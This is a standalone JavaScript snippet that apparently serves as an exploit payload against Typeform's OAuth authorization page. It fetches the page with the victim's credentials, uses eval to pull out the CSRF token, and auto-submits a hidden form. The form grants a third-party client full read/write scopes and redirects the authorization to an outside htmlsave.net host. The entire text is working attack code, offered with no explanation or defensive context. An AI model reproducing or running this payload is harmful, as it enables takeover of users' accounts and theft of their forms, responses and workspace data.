window.scope = 'accounts:read+forms:read+forms:write+images:read+images:write+responses:read+responses:write+themes:read+themes:write+webhooks:read+webhooks:write+workspaces:read+workspaces:write'; 
x = new XMLHttpRequest();
window.r = Math.random();
x.open('get','https://admin.typeform.com/oauth/authorize?client_id=B8wt6EjBFFLGh1hi1oHxfkXLaJ7AK3jzLeM3Kxcx2FwQ&redirect_uri=https://5f3a7abb0938b.htmlsave.net/&scope='+window.scope+'&state='+window.r);
x.withCredentials = true;
x.send();
x.onload = function (){
     eval(x.responseText.split('<script>')[1].split('</script>')[0]);
    csrfT = window.CONTEXT.csrfToken; 
    url = 'https://admin.typeform.com/oauth/authorize?client_id=6Y1qcSTWiSayE45bNDTLcH1ySYx6sXTqheEsUY4Qi1Gb&redirect_uri=https://5f3a7abb0938b.htmlsave.net/&scope='+window.scope+'&state='+window.r;
   go(url,csrfT);
   
};

function go(url,token){
    html = `<form action="`+url+`" method=POST name=ex>
    <input type=hidden name=csrfToken value="`+token+`" />
    </form> `;
    document.body.innerHTML += html;
    document.ex.submit();
}
